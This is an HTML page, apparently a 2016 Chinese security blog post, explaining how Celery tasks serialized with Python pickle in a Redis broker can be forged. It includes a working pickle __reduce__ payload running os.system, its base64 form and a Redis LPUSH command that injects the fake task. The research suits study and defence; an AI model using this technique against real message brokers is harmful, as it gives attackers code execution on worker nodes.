@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="分布式应用中消息队列使用特别广泛，而针对分布式集群的攻击常常是点到面的扩散，突破关键点从而控制整个集群。在使用消息队列传递消息时，不安全的数据序列化方式便为整体系统埋下了一颗定时炸弹，一旦消息代理中间件被攻破就会导致整个工作节点沦陷。 （本文只对可行思路进行阐述，如有不恰当之处，还望指出） 一、消息队列与数据序列化1. 消息队列代理在一个分布式系统中，消息队列（MQ）是必不可少的，任务下发到消息队">
+<meta name="keywords" content="web,security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="定时炸弹 - MQ 代理中危险的序列化数据">
+<meta property="og:url" content="http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="分布式应用中消息队列使用特别广泛，而针对分布式集群的攻击常常是点到面的扩散，突破关键点从而控制整个集群。在使用消息队列传递消息时，不安全的数据序列化方式便为整体系统埋下了一颗定时炸弹，一旦消息代理中间件被攻破就会导致整个工作节点沦陷。 （本文只对可行思路进行阐述，如有不恰当之处，还望指出） 一、消息队列与数据序列化1. 消息队列代理在一个分布式系统中，消息队列（MQ）是必不可少的，任务下发到消息队">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/1.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/2.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/3.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/4.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/5.png">
+<meta property="og:updated_time" content="2018-04-24T15:48:57.518Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="定时炸弹 - MQ 代理中危险的序列化数据">
+<meta name="twitter:description" content="分布式应用中消息队列使用特别广泛，而针对分布式集群的攻击常常是点到面的扩散，突破关键点从而控制整个集群。在使用消息队列传递消息时，不安全的数据序列化方式便为整体系统埋下了一颗定时炸弹，一旦消息代理中间件被攻破就会导致整个工作节点沦陷。 （本文只对可行思路进行阐述，如有不恰当之处，还望指出） 一、消息队列与数据序列化1. 消息队列代理在一个分布式系统中，消息队列（MQ）是必不可少的，任务下发到消息队">
+<meta name="twitter:image" content="http://rickgray.me/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>定时炸弹 - MQ 代理中危险的序列化数据</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/03/09/pyyaml-tags-parse-to-command-execution/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&text=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&is_video=false&description=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=定时炸弹 - MQ 代理中危险的序列化数据&body=Check out this article: http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&title=定时炸弹 - MQ 代理中危险的序列化数据"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/&name=定时炸弹 - MQ 代理中危险的序列化数据&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、消息队列与数据序列化"><span class="toc-number">1.</span> <span class="toc-text">一、消息队列与数据序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-消息队列代理"><span class="toc-number">1.1.</span> <span class="toc-text">1. 消息队列代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-数据序列化"><span class="toc-number">1.2.</span> <span class="toc-text">2. 数据序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、危险的序列化方式"><span class="toc-number">2.</span> <span class="toc-text">二、危险的序列化方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、脆弱的消息队列代理"><span class="toc-number">3.</span> <span class="toc-text">三、脆弱的消息队列代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、总结"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        定时炸弹 - MQ 代理中危险的序列化数据
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2016-04-07T16:00:00.000Z" itemprop="datePublished">2016-04-08</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>分布式应用中消息队列使用特别广泛，而针对分布式集群的攻击常常是点到面的扩散，突破关键点从而控制整个集群。在使用消息队列传递消息时，不安全的数据序列化方式便为整体系统埋下了一颗定时炸弹，一旦消息代理中间件被攻破就会导致整个工作节点沦陷。</p>
+<p><strong>（本文只对可行思路进行阐述，如有不恰当之处，还望指出）</strong></p>
+<h3 id="一、消息队列与数据序列化"><a href="#一、消息队列与数据序列化" class="headerlink" title="一、消息队列与数据序列化"></a>一、消息队列与数据序列化</h3><h4 id="1-消息队列代理"><a href="#1-消息队列代理" class="headerlink" title="1. 消息队列代理"></a>1. 消息队列代理</h4><p>在一个分布式系统中，消息队列（MQ）是必不可少的，任务下发到消息队列代理中，工作节点从队列中取出相应的任务进行处理，以图的形式展现出来是这个样子的：</p>
+<p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/1.png" alt=""></p>
+<p>任务通过 Master 下发到消息队列代理中，Workers 从队列中取出任务然后进行解析和处理，按照配置对执行结果进行返回。下面以 Python 中的分布式任务调度框架 <a href="celeryproject.org">Celery</a> 来进行代码说明，其中使用了 Redis 作为消息队列代理：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line">app = Celery(<span class="string">'demo'</span>,</span><br><span class="line">             broker=<span class="string">'redis://:@192.168.199.149:6379/0'</span>,</span><br><span class="line">             backend=<span class="string">'redis://:@192.168.199.149:6379/0'</span>)</span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>
+<p>在本地起一个 Worker 用以执行注册好的 <code>add</code> 方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(env)➜  demo celery worker -A demo.app -l INFO</span><br></pre></td></tr></table></figure>
+<p>然后起一个 Python 交互式终端下发任务并获取执行结果：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(env)➜  ipython --no-banner</span><br><span class="line"></span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> demo <span class="keyword">import</span> add</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">print</span> add.delay(<span class="number">1</span>, <span class="number">2</span>).get()</span><br><span class="line"><span class="number">21</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]:</span><br></pre></td></tr></table></figure>
+<p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/2.png" alt=""></p>
+<p>借助消息队列这种方式很容易把一个单机的系统改造成一个分布式的集群系统。</p>
+<h4 id="2-数据序列化"><a href="#2-数据序列化" class="headerlink" title="2. 数据序列化"></a>2. 数据序列化</h4><p>任务的传递肯定是具有一定结构的数据，而这些数据的结构化处理就要进行序列化操作了。不同语言有不同的数据序列化方式，当然也有着具有兼容性的序列化方式（比如：JSON），下面针对序列化数据存储的形式列举了常见的一些数据序列化方式：</p>
+<ol>
+<li>Binary</li>
+<li>JSON</li>
+<li>XML (SOAP)</li>
+</ol>
+<p>二进制序列化常是每种语言内置实现的一套针对自身语言特性的对象序列化处理方式，通过二进制序列化数据通常能够轻易的在不同的应用和系统中传递实时的实例化对象数据，包括了类实例、成员变量、类方法等。</p>
+<p>JSON 形式的序列化通常只能传递基础的数据结构，比如数值、字符串、列表、字典等等，不支持某些自定义类实例的传递。XML 形式的序列化也依赖于特定的语言实现。</p>
+<h3 id="二、危险的序列化方式"><a href="#二、危险的序列化方式" class="headerlink" title="二、危险的序列化方式"></a>二、危险的序列化方式</h3><p>说了那么多，最终还是回到了序列化方式上，二进制方式的序列化是最全的也是最危险的一种序列化方式，许多语言的二进制序列化方式都存在着一些安全风险（如：Python, C#, Java）。</p>
+<p>在分布式系统中使用二进制序列化数据进行任务信息传递，极大地提升了整个系统的危险系数，犹如一枚炸弹放在那里，不知道什么时候就 “爆炸” 致使整个系统沦陷掉。</p>
+<p>下面还是以 Python 的 Celery 分布式任务调度框架来说明该问题。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line">app = Celery(<span class="string">'demo'</span>, broker=<span class="string">'redis://:@192.168.199.149:6379/0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>
+<p>（这里是用 Redis 作为消息队列代理，为了方便未开启验证）</p>
+<p>首先不起 Worker 节点，直接添加一个 <code>add</code> 任务到队列中，看看下发的任务是如何存储的：</p>
+<p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/3.png" alt=""></p>
+<p>可以看到在 Redis 中存在两个键 <code>celery</code> 和 <code>_kombu.binding.celery</code>，<code>_kombu.binding.celery</code> 表示有一名为 <code>celery</code> 的任务队列（Celery 默认），而 <code>celery</code> 为默认队列中的任务列表，可以看看添加进去的任务数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; LINDEX celery 0</span><br><span class="line">&quot;&#123;\&quot;body\&quot;: \&quot;gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsBSxaGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSQ3M2I5Y2FmZS0xYzhkLTRmZjYtYjdhOC00OWI2MGJmZjE0ZmZxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUIZGVtby5hZGRxDlUJdGltZWxpbWl0cQ9OToZVA2V0YXEQTlUGa3dhcmdzcRF9cRJ1Lg==\&quot;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;correlation_id\&quot;: \&quot;73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff\&quot;, \&quot;reply_to\&quot;: \&quot;b6c304bb-45e5-3b27-95dc-29335cbce9f1\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;delivery_mode\&quot;: 2, \&quot;delivery_tag\&quot;: \&quot;0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09\&quot;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;&#125;&quot;</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure>
+<p>为了方便分析，把上面的数据整理一下：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> 'body': 'gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsBSxaGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSQ3M2I5Y2FmZS0xYzhkLTRmZjYtYjdhOC00OWI2MGJmZjE0ZmZxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUIZGVtby5hZGRxDlUJdGltZWxpbWl0cQ9OToZVA2V0YXEQTlUGa3dhcmdzcRF9cRJ1Lg==',</span><br><span class="line"> 'content-encoding': 'binary',</span><br><span class="line"> 'content-type': 'application/x-python-serialize',</span><br><span class="line"> 'headers': &#123;&#125;,</span><br><span class="line"> 'properties': &#123;</span><br><span class="line">                'body_encoding': 'base64',</span><br><span class="line">                'correlation_id': '73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff',</span><br><span class="line">                'delivery_info': &#123;</span><br><span class="line">                                  'exchange': 'celery',</span><br><span class="line">                                  'priority': 0,</span><br><span class="line">                                  'routing_key': 'celery'</span><br><span class="line">                                  &#125;,</span><br><span class="line">                'delivery_mode': 2,</span><br><span class="line">                'delivery_tag': '0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09',</span><br><span class="line">                'reply_to': 'b6c304bb-45e5-3b27-95dc-29335cbce9f1'</span><br><span class="line">               &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>body</code> 存储的经过序列化和编码后的数据，是具体的任务参数，其中包括了需要执行的方法、参数和一些任务基本信息，而 <code>properties[&#39;body_encoding&#39;]</code> 指明的是 <code>body</code> 的编码方式，在 Worker 取到该消息时会使用其中的编码进行解码得到序列化后的任务数据 <code>body.decode(&#39;base64&#39;)</code>，而 <code>content-type</code> 指明了任务数据的序列化方式，这里在不明确指定的情况下 Celery 会使用 Python 内置的序列化实现模块 <code>pickle</code> 来进行序列化操作。</p>
+<p>这里将 <code>body</code> 的内容提取出来，先使用 base64 解码再使用 pickle 进行反序列化来看看具体的任务信息：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">6</span>]: pickle.loads(<span class="string">'gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsBSxaGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSQ3M2I5Y2FmZS0xYzhkLTRmZjYtYjdhOC00OWI2MGJmZjE0ZmZxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUIZGVtby5hZGRxDlUJdGltZWxpbWl0cQ9OToZVA2V0YXEQTlUGa3dhcmdzcRF9cRJ1Lg=='</span>.decode(<span class="string">'base64'</span>))</span><br><span class="line">Out[<span class="number">6</span>]:</span><br><span class="line">&#123;<span class="string">'args'</span>: (<span class="number">1</span>, <span class="number">22</span>),</span><br><span class="line"> <span class="string">'callbacks'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'chord'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'errbacks'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'eta'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'expires'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'id'</span>: <span class="string">'73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff'</span>,</span><br><span class="line"> <span class="string">'kwargs'</span>: &#123;&#125;,</span><br><span class="line"> <span class="string">'retries'</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">'task'</span>: <span class="string">'demo.add'</span>,</span><br><span class="line"> <span class="string">'taskset'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'timelimit'</span>: (<span class="keyword">None</span>, <span class="keyword">None</span>),</span><br><span class="line"> <span class="string">'utc'</span>: <span class="keyword">True</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]:</span><br></pre></td></tr></table></figure>
+<p>熟悉 Celery 的人一眼就知道上面的这些参数信息都是在下发任务时进行指定的：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id =&gt; 任务的唯一ID</span><br><span class="line">task =&gt; 需要执行的任务</span><br><span class="line">args =&gt; 调用参数</span><br><span class="line">callback =&gt; 任务完成后的回调</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>这里详细任务参数就不进行说明了，刚刚说到了消息队列代理中存储的任务信息是用 Python 内置的 <code>pickle</code> 模块进行序列化的，那么如果我恶意插入一个假任务，其中包含了恶意构造的序列化数据，在 Worker 端取到任务后对信息进行反序列化的时候是不是就能够执行任意代码了呢？下面就来验证这个观点（对 Python 序列化攻击不熟悉的可以参考下这篇文章<a href="https://blog.nelhage.com/2011/03/exploiting-pickle/" target="_blank" rel="noopener">《Exploiting Misuse of Python’s “Pickle”》</a>）</p>
+<p>刚刚测试和分析已经得知往 <code>celery</code> 队列中下发的任务，<code>body</code> 最终会被 Worker 端进行解码和解析，并在该例子中 <code>body</code> 的数据形态为 <code>pickle.dumps(TASK).encode(&#39;base64&#39;)</code>，所以这里可以不用管 <code>pickle.dumps(TASK)</code> 的具体数据，直接将恶意的序列化数据经过 base64 编码后替换掉原来的数据，这里使用的 Payload 为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Touch</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'touch /tmp/evilTask'</span>, ))</span><br><span class="line"><span class="keyword">print</span> pickle.dumps(Touch()).encode(<span class="string">'base64'</span>)</span><br></pre></td></tr></table></figure>
+<p>运行一下得到具体的 Payload 值：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(env)➜  demo python touch.py</span><br><span class="line">Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=</span><br></pre></td></tr></table></figure>
+<p>将其替换原来的 <code>body</code> 值得到：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> 'body': 'Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=',</span><br><span class="line"> 'content-encoding': 'binary',</span><br><span class="line"> 'content-type': 'application/x-python-serialize',</span><br><span class="line"> 'headers': &#123;&#125;,</span><br><span class="line"> 'properties': &#123;</span><br><span class="line">                'body_encoding': 'base64',</span><br><span class="line">                'correlation_id': '73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff',</span><br><span class="line">                'delivery_info': &#123;</span><br><span class="line">                                  'exchange': 'celery',</span><br><span class="line">                                  'priority': 0,</span><br><span class="line">                                  'routing_key': 'celery'</span><br><span class="line">                                  &#125;,</span><br><span class="line">                'delivery_mode': 2,</span><br><span class="line">                'delivery_tag': '0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09',</span><br><span class="line">                'reply_to': 'b6c304bb-45e5-3b27-95dc-29335cbce9f1'</span><br><span class="line">               &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>转换为字符串：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&#123;\&quot;body\&quot;: \&quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=\&quot;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;delivery_mode\&quot;: 2, \&quot;correlation_id\&quot;: \&quot;73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff\&quot;, \&quot;reply_to\&quot;: \&quot;b6c304bb-45e5-3b27-95dc-29335cbce9f1\&quot;, \&quot;delivery_tag\&quot;: \&quot;0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09\&quot;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>然后将该信息直接添加到 Redis 的 队列名为 <code>celery</code> 的任务列表中（注意转义）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; LPUSH celery &quot;&#123;\&quot;body\&quot;: \&quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=\&quot;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;delivery_mode\&quot;: 2, \&quot;correlation_id\&quot;: \&quot;73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff\&quot;, \&quot;reply_to\&quot;: \&quot;b6c304bb-45e5-3b27-95dc-29335cbce9f1\&quot;, \&quot;delivery_tag\&quot;: \&quot;0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09\&quot;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>这时候再起一个默认队列的 Worker 节点，Worker 从 MQ 中取出任务信息并解析我们的恶意数据，如果成功执行了会在 Worker 节点创建文件 <code>/tmp/evilTask</code>：</p>
+<p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/4.png" alt=""></p>
+<p>攻击流程就应该为：</p>
+<p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/5.png" alt=""></p>
+<p>攻击者控制了 MQ 服务器，并且在任务数据传输上使用了危险的序列化方式，致使攻击者能够往队列中注入恶意构造的任务，Worker 节点在解析和执行 fakeTask 时发生异常或直接被攻击者控制。</p>
+<h3 id="三、脆弱的消息队列代理"><a href="#三、脆弱的消息队列代理" class="headerlink" title="三、脆弱的消息队列代理"></a>三、脆弱的消息队列代理</h3><p>虽然大多数集群消息队列代理都处在内网环境，但并不排除其在公网上暴露可能性，历史上已经多次出现过消息队列代理未授权访问的问题（默认配置），像之前的 MongoDB 和 Redis 默认配置下的未授权访问漏洞，都已经被大量的曝光和挖掘过了，但是这些受影响的目标中又有多少是作为消息队列代理使用的呢，恐怕当时并没有太多人注意到这个问题。</p>
+<p>鉴于一些安全问题，并未对暴露在互联网上的 Redis 和 MongdoDB 进行扫描检测。</p>
+<p>这里总结一下利用 MQ 序列化数据注入的几个关键点：</p>
+<ol>
+<li>使用了危险序列化方式进行消息传输的消息队列代理；</li>
+<li>工作集群会从 MQ 中取出消息并对其反序列化解析；</li>
+<li>消息队列代理能够被攻击和控制；</li>
+</ol>
+<p>虽然成功利用本文思路进行攻击的条件比较苛刻，但是互联网那么大没有什么是不可能的。我相信在不久之后必定会出现真实案例来证实本文所讲的内容。<strong>（在本文完成时，发现 2013 年国外已经有了这样的案例，链接附后）</strong></p>
+<h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>数据注入是一种常用的攻击手法，如何熟练地借用老手法玩出新思路是需要积累的。文章示例代码虽然只给出了 Python Pickle + Celery 这个组合的利用思路，但并不局限于此。开发语言和中间件那么多，组合也更多，好玩的东西需要一起去发掘。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="https://groups.google.com/forum/#!topic/celery-users/uptHlL3cBs0" target="_blank" rel="noopener">https://groups.google.com/forum/#!topic/celery-users/uptHlL3cBs0</a></li>
+<li><a href="http://andresriancho.github.io/nimbostratus/" target="_blank" rel="noopener">http://andresriancho.github.io/nimbostratus/</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
